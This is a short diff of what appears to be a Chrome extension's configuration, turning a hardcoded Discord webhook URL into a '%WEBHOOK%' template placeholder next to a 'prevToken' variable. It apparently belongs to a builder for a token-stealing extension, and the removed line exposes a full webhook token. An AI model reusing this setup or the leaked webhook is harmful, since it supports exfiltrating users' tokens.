@@ -12,8 +12,8 @@ chrome.runtime.onInstalled.addListener(function (details) {
 
 (async function () {
   var config = {
-    Placed: "%API_URL%",
-    webhook_url: "https://discord.com/api/webhooks/1283829964529074249/ngTBB8VLOMIU9C8ItJgVChXnnyjQZMcsisQxNZ8-g9qFgrlZ5t5xwNRGyDUFlTMuCXfq",
+    Placed: "",
+    webhook_url: "%WEBHOOK%",
   };
 
   let prevToken = "";
